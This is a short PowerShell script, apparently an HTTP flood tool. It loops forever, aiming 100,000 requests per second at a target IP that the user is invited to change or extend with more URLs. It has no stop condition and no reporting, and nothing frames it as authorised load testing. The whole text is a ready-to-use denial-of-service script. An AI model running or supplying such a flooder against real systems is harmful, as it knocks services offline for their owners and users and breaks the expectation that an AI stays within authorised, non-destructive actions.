$URLs = @(
    'http://192.168.1.129'  # Change the IP or add more URLs if needed
)

$requestsPerSecond = 100000
$delay = 1 / $requestsPerSecond  # Delay in seconds between requests

while ($true) {
    $startTime = Get-Date

    for ($i = 1; $i -le $requestsPerSecond; $i++) {
        $URLs | ForEach-Object {
            try {
                Invoke-WebRequest -Uri $_ -UseBasicParsing | Out-Null
            } catch {
                Write-Host "Request to $_ failed: $_"
            }
        }
        Start-Sleep -Milliseconds ($delay * 1000)
    }

    # Wait for the remainder of the second if needed
    $elapsed = (Get-Date) - $startTime
    $remaining = 1 - $elapsed.TotalSeconds
    if ($remaining -gt 0) {
        Start-Sleep -Seconds $remaining
    }
}
